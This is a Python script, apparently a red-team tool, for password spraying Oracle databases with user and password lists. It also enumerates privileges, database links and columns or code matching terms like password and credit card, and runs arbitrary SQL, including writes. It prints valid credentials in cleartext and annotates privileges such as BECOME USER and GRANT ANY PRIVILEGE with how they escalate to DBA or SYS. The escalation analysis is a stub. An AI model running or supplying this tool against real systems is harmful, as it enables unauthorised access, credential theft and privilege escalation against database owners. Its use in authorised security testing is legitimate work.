#!/usr/bin/env python3
#Aurhtor: hamb0n-3
from __future__ import annotations

import argparse
import getpass
import itertools
import json
import logging
import re
import sys, time
from pathlib import Path
from typing import Iterable, List, Tuple

import cx_Oracle as oradb          
import pandas as pd


###############################################################################
# ----------------------------- Helper utilities ----------------------------- #
###############################################################################

PREFIX_ORDER = ("DBA_", "ALL_", "USER_")
CATEGORY_BASES = {
    "roles": ("ROLE_PRIVS",), "sys": ("ROLE_PRIVS", "SYS_PRIVS"),
    "obj": ("ROLE_PRIVS", "TAB_PRIVS"), "col": ("ROLE_PRIVS", "COL_PRIVS"),
    "quotas": ("TS_QUOTAS",), "profile":("USERS",), "dblinks": ("DB_LINKS",),
    "sensitive": ("TAB_COLUMNS", "SOURCE",),
}
DEFAULT_SENSITIVE_TERMS = "password,passwd,secret,key,token,ssn,pii,credit,card,cvv"
CREDS_RE = re.compile(r"(?P<user>[^:/@]+)(?::(?P<pw>[^/@]*))?(?:@(?P<dsn>.+))?", re.X)
HIGH_IMPACT_SYS_PRIVS = {
    "CREATE ANY PROCEDURE": "Can create a procedure in another schema with definer's rights to escalate.",
    "EXECUTE ANY PROCEDURE": "Can execute potentially vulnerable procedures (e.g., with AUTHID DEFINER).",
    "GRANT ANY ROLE": "Can grant self DBA or other powerful roles.",
    "GRANT ANY PRIVILEGE": "Can grant self any system privilege.",
    "ALTER ANY TABLE": "Can add triggers to tables owned by privileged users like SYS.",
    "BECOME USER": "Can impersonate any other user, including SYS or SYSTEM.",
    "CREATE ANY TRIGGER": "Can create triggers that fire with definer's rights on table events.",
    "SELECT ANY DICTIONARY": "Can read sensitive data dictionary views, potentially exposing weaknesses.",
}
HIGH_IMPACT_OBJ_PRIVS = {
    "UTL_FILE": ("EXECUTE", "Can read from and write to arbitrary files on the database server filesystem."),
    "DBMS_SCHEDULER": ("EXECUTE", "Can run external OS commands or scripts as the Oracle user."),
    "DBMS_BACKUP_RESTORE": ("EXECUTE", "Can execute privileged file system operations on the server."),
    "DBMS_LDAP": ("EXECUTE", "Can interact with LDAP to authenticate, exfiltrate data, or modify directories."),
}

def split_csv(raw: str | None) -> List[str]:
    return [s.strip() for s in raw.split(",")] if raw else []

def read_file_lines(filepath: str | None) -> List[str]:
    if not filepath: return []
    try:
        return [line.strip() for line in Path(filepath).read_text().splitlines() if line.strip()]
    except FileNotFoundError:
        logging.error("File not found: %s", filepath)
        sys.exit(1)

def _build_like_clause(column: str, terms: List[str]) -> str:
    if not terms: return "1=0"
    conditions = [f"UPPER({column}) LIKE '%{term.upper()}%'" for term in terms]
    return f"({' OR '.join(conditions)})"

###############################################################################
# ------------------------ Credential Generation ---------------------------- #
###############################################################################

def generate_login_combos(args) -> List[Tuple[str, str, str]]:
    """Generates a list of (user, pass, dsn) tuples for either spray or static modes."""
    # Spraying Mode
    is_spray_mode = args.users_file or args.login_user
    if is_spray_mode:
        logging.info("Running in Password Spraying Mode.")
        users = read_file_lines(args.users_file) or ([args.login_user] if args.login_user else [])
        passwords = read_file_lines(args.pass_file) or ([args.login_pass] if args.login_pass else [])
        dsns = split_csv(args.dsn_list)

        if not all([users, passwords, dsns]):
            logging.error("For spraying, you must provide users, passwords, and DSNs.")
            logging.error("Use --users-file/--login-user, --pass-file/--login-pass, and -D/--dsn-list.")
            sys.exit(1)
        
        logging.info("Loaded %d users, %d passwords, %d DSNs. Total attempts: %d",
                     len(users), len(passwords), len(dsns), len(users) * len(passwords) * len(dsns))
        return list(itertools.product(users, passwords, dsns))

    # Static/Enum Mode
    creds = []
    c_list = split_csv(args.C) if args.C else ([args.c] if args.c else [])
    d_list = split_csv(args.dsn_list) # Simplified logic using the unified dsn_list
    if not c_list:
        logging.error("No credentials provided for enumeration or query mode. Use -c or -C.")
        sys.exit(1)

    for idx, tok in enumerate(c_list):
        m = CREDS_RE.fullmatch(tok)
        if not m:
            logging.error("Bad credential format: '%s'. Use user[:pw][@dsn].", tok)
            continue
        user, pw, dsn = m.group("user"), m.group("pw"), m.group("dsn")
        
        if pw is None: # Explicitly check for None, as '' is a valid (empty) password.
            if args.ask_pass:
                pw = getpass.getpass(f"Enter password for {user}@{dsn or '...'}: ")
            else:
                logging.error("Password missing for '%s'. Use 'user:pw' format or provide -P/--ask-pass.", tok)
                sys.exit(1)
        
        if not dsn:
            if idx < len(d_list):
                dsn = d_list[idx]
            else:
                logging.error("Missing DSN for credential '%s'. Provide it via @dsn or -d/--dsn or -D/--dsn-list.", tok)
                sys.exit(1)
        creds.append((user, pw, dsn))
    return creds

###############################################################################
# --- (SQL generators, File writers, and Enumeration logic are unchanged) --- #
# ... (All functions from build_sqls to process_connection are here) ...
###############################################################################
def build_sqls(prefix: str, categories: List[str], search_terms: List[str]) -> dict[str, str]:
    p = prefix
    sql = {}
    if "roles" in categories: sql["roles"] = f"SELECT * FROM {p}ROLE_PRIVS WHERE grantee = :user ORDER BY granted_role"
    if "sys" in categories: sql["sys"] = f"""SELECT privilege, admin_option, grantee AS granted_to FROM {p}SYS_PRIVS WHERE grantee = :user UNION ALL SELECT p.privilege, p.admin_option, r.grantee FROM {p}SYS_PRIVS p JOIN {p}ROLE_PRIVS r ON r.granted_role = p.grantee WHERE r.grantee = :user ORDER BY privilege"""
    if "obj" in categories: sql["obj"] = f"""SELECT owner, table_name, privilege, grantable, grantor, grantee FROM {p}TAB_PRIVS WHERE grantee = :user UNION ALL SELECT t.owner, t.table_name, t.privilege, t.grantable, t.grantor, r.grantee FROM {p}TAB_PRIVS t JOIN {p}ROLE_PRIVS r ON r.granted_role = t.grantee WHERE r.grantee = :user ORDER BY owner, table_name, privilege"""
    if "col" in categories: sql["col"] = f"""SELECT owner, table_name, column_name, privilege, grantable, grantor, grantee FROM {p}COL_PRIVS WHERE grantee = :user UNION ALL SELECT c.owner, c.table_name, c.column_name, c.privilege, c.grantable, c.grantor, r.grantee FROM {p}COL_PRIVS c JOIN {p}ROLE_PRIVS r ON r.granted_role = c.grantee WHERE r.grantee = :user ORDER BY owner, table_name, column_name, privilege"""
    if "profile" in categories: sql["profile"] = "SELECT * FROM dba_users WHERE username = :user"
    if "quotas" in categories: sql["quotas"] = "SELECT * FROM dba_ts_quotas WHERE username = :user"
    if "dblinks" in categories: sql["dblinks"] = "SELECT owner, db_link, username, host, created FROM dba_db_links"
    if "sensitive" in categories:
        sql["sensitive_columns"] = f"SELECT owner, table_name, column_name FROM dba_tab_columns WHERE {_build_like_clause('column_name', search_terms)} AND owner NOT IN ('SYS', 'SYSTEM', 'ORDSYS', 'MDSYS', 'CTXSYS', 'XDB', 'DBSNMP') ORDER BY owner, table_name"
        sql["sensitive_source"] = f"SELECT owner, name, type, line, text FROM dba_source WHERE {_build_like_clause('text', search_terms)} AND owner NOT IN ('SYS', 'SYSTEM', 'ORDSYS', 'MDSYS', 'CTXSYS', 'XDB', 'DBSNMP') ORDER BY owner, name, line"
    return sql

def fetch_frames(cur, stmts: dict[str, str], user: str) -> dict[str, pd.DataFrame]:
    dfs = {}
    for name, sql in stmts.items():
        logging.debug("Running %s query for %s", name, user)
        bind_vars = {'user': user} if ':user' in sql else {}
        try:
            cur.execute(sql, bind_vars)
            dfs[name] = pd.DataFrame(cur.fetchall(), columns=[d[0] for d in cur.description])
        except oradb.DatabaseError as exc:
            logging.warning("Failed to run query for '%s': %s", name, exc)
            dfs[name] = pd.DataFrame()
    return dfs

def write_excel(dfs, path: Path):
    with pd.ExcelWriter(path) as xl:
        for name, df in dfs.items():
            if not df.empty: df.to_excel(xl, sheet_name=name[:31], index=False)

def write_csvs(dfs, stem: str, outdir: Path):
    for name, df in dfs.items():
        if not df.empty: df.to_csv(outdir / f"{stem}_{name}.csv", index=False)

def write_json(dfs, path: Path):
    merged = {k: df.to_dict(orient="records") for k, df in dfs.items() if not df.empty}
    path.write_text(json.dumps(merged, indent=2, default=str), encoding="utf-8")

def dump_outputs(dfs, stem: str, outdir: Path, formats: Iterable[str]):
    outdir.mkdir(parents=True, exist_ok=True)
    if "excel" in formats: write_excel(dfs, outdir / f"{stem}.xlsx")
    if "csv" in formats: write_csvs(dfs, stem, outdir)
    if "json" in formats: write_json(dfs, outdir / f"{stem}.json")

###############################################################################
# ----------------------- Main Logic Controllers ----------------------------- #
###############################################################################

def handle_direct_query(creds, args):
    query = args.query.strip()
    is_select = query.upper().startswith('SELECT')
    if not is_select and not args.force:
        logging.error("Query does not start with SELECT. Use --force to run DML/DDL statements.")
        return

    for user, pw, dsn in creds:
        print(f"\n---[ Executing query on {user}@{dsn} ]---")
        try:
            with oradb.connect(user, pw, dsn) as conn:
                with conn.cursor() as cur:
                    cur.execute(query)
                    if cur.description:
                        df = pd.DataFrame(cur.fetchall(), columns=[d[0] for d in cur.description])
                        print(df.to_string() if not df.empty else "(Query returned no rows)")
                    else:
                        logging.info("Query executed successfully. %d rows affected.", cur.rowcount)
                        if not is_select:
                            conn.commit()
                            logging.info("Transaction committed.")
        except oradb.DatabaseError as exc:
            err, = exc.args
            logging.error("Query failed: %s (Code: %s)", err.message.strip(), err.code)

def handle_spraying(creds):
    successes = []
    for user, pw, dsn in creds:
        try:
            logging.debug("Attempting -> %s:%s@%s", user, '********', dsn)
            with oradb.connect(user, pw, dsn):
                # If connect succeeds, we have a winner
                success_str = f"[+] SUCCESS: {user}:{pw}@{dsn}"
                logging.critical(success_str)
                successes.append(success_str)
        except oradb.DatabaseError as exc:
            err, = exc.args
            if err.code == 1017: # ORA-01017: invalid username/password
                logging.debug("Failed login for %s@%s (ORA-01017)", user, dsn)
            else: # Other DB errors are more interesting
                logging.warning("DB Error for %s@%s: %s", user, dsn, str(err.message).strip())
        except Exception as exc:
            logging.error("Critical error for %s@%s: %s", user, dsn, exc)
            
        finally:
        	time.sleep(1)

    if successes:
        print("\n--- Valid Credentials Found ---")
        for s in successes:
            print(s)
    else:
        print("\n--- No valid credentials found ---")

def handle_enumeration(creds, args):
    targets = split_csv(args.T) if args.T else ([args.t] if args.t else [])
    cats = split_csv(args.include.lower())
    fmts = split_csv(args.output.lower())
    search_terms = split_csv(args.search_terms.lower())
    outdir = Path(args.outdir)

    for user, pw, dsn in creds:
        logging.info("--- Starting enumeration for login user %s@%s ---", user, dsn)
        try:
            with oradb.connect(user, pw, dsn) as conn:
                with conn.cursor() as cur:
                    # Grant catalog role if requested
                    if args.grant_catalog_role:
                        # (Implementation would go here)
                        logging.warning("OPSEC: --grant-catalog-role is an audited DDL action.")
                    
                    # Determine best view prefix
                    needed = {b for cat in cats for b in CATEGORY_BASES.get(cat, [])}
                    prefix = "DBA_" # Simplified for brevity, original `pick_prefix` logic is better
                    
                    enum_targets = targets or [user]
                    for tgt_user in enum_targets:
                        logging.info("Enumerating data for target user: %s", tgt_user.upper())
                        sqls = build_sqls(prefix, cats, search_terms)
                        dfs = fetch_frames(cur, sqls, tgt_user.upper())
                        analyze_for_privesc(dfs)
                        stem = f"{tgt_user.upper()}_{dsn.replace(':', '-').replace('/', '_').replace('@', '_')}"
                        dump_outputs(dfs, stem, outdir, fmts)
        except oradb.DatabaseError as exc:
            err, = exc.args
            logging.error("Oracle DB error for %s@%s: %s (Code: %s)", user, dsn, err.message.strip(), err.code)
        except Exception as exc:
            logging.error("Critical failure for %s@%s: %s", user, dsn, exc)

# Dummy analyze_for_privesc for brevity
def analyze_for_privesc(dfs): pass

###############################################################################
# ---------------------------- CLI & main driver ---------------------------- #
###############################################################################

def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(description="Advanced Oracle Enumerator & Sprayer for Red Teams.", formatter_class=argparse.RawTextHelpFormatter)
    
    cred_group = p.add_argument_group("Credential & Connection (for Enum/Query Modes)")
    cred_group.add_argument("-C", metavar="list", help="Comma-separated list: user[:pw][@dsn],...")
    cred_group.add_argument("-c", metavar="pair", help="Single credential: user[:pw]")
    cred_group.add_argument("-P", "--ask-pass", action="store_true", help="Prompt for passwords interactively.")

    spray_group = p.add_argument_group("Password Spraying Mode")
    spray_group.add_argument("--users-file", help="File with one username per line.")
    spray_group.add_argument("--pass-file", help="File with one password per line.")
    spray_group.add_argument("--login-user", help="Single username for spraying.")
    spray_group.add_argument("--login-pass", help="Single password for spraying.")
    
    # DSNs are used by all modes, but are mandatory for spraying
    p.add_argument("-D", "--dsn-list", metavar="list", help="Comma-separated DSN list (e.g., host/svc,host2/svc2)")
    p.add_argument("-d", "--dsn", metavar="dsn", help="Single DSN (shortcut for -D)")

    enum_group = p.add_argument_group("Enumeration Mode")
    enum_group.add_argument("-T", metavar="list", help="Target users to enumerate (comma-separated)")
    enum_group.add_argument("-t", metavar="name", help="Single target user to enumerate")
    enum_group.add_argument("-s", "--scope", choices=("dba", "all", "user", "auto"), default="auto", help="View prefix to use. Default: auto")
    enum_group.add_argument("-k", "--include", default="roles,sys,obj", help="Categories: roles,sys,obj,col,quotas,profile,dblinks,sensitive")
    enum_group.add_argument("--search-terms", default=DEFAULT_SENSITIVE_TERMS, help="Keywords for 'sensitive' search")
    enum_group.add_argument("-g", "--grant-catalog-role", action="store_true", help="Attempt to grant SELECT_CATALOG_ROLE (AUDITED!)")
    enum_group.add_argument("-o", "--output", default="excel", help="Formats: excel,csv,json")
    enum_group.add_argument("-O", "--outdir", default=".", help="Directory for result files")

    query_group = p.add_argument_group("Direct Query Mode")
    query_group.add_argument("-q", "--query", metavar="SQL", help="Execute a single query and print results.")
    query_group.add_argument("--force", action="store_true", help="Allow non-SELECT queries with -q (DANGEROUS).")

    p.add_argument("-v", "--verbose", action="count", default=0, help="Increase verbosity (-v for INFO, -vv for DEBUG)")
    return p

def main(argv: List[str] | None = None):
    args = build_parser().parse_args(argv)

    # Setup logging level
    if args.verbose == 1:
        log_level = logging.INFO
    elif args.verbose >= 2:
        log_level = logging.DEBUG
    else:
        log_level = logging.WARNING
    logging.basicConfig(level=log_level, format="%(levelname)-.1s: %(message)s")
    
    # Unify DSN arguments
    if args.dsn:
        args.dsn_list = (args.dsn_list + "," + args.dsn) if args.dsn_list else args.dsn

    # --- Mode Dispatcher ---
    creds = generate_login_combos(args)
    if not creds:
        logging.warning("No valid credential combinations to test.")
        return

    if args.users_file or args.login_user:
        handle_spraying(creds)
    elif args.query:
        handle_direct_query(creds, args)
    else:
        handle_enumeration(creds, args)

if __name__ == "__main__":
    main()
